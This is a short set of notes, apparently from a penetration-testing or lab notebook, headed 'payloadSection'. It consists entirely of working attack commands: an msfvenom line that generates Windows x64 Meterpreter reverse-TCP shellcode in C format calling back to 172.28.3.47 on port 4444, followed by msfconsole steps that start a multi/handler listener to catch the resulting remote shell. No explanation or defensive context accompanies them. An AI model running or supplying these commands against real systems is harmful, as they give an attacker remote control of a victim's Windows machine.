# payloadSection

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.28.3.47 lport=4444 -f c

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 172.28.3.47
set lport 4444
run
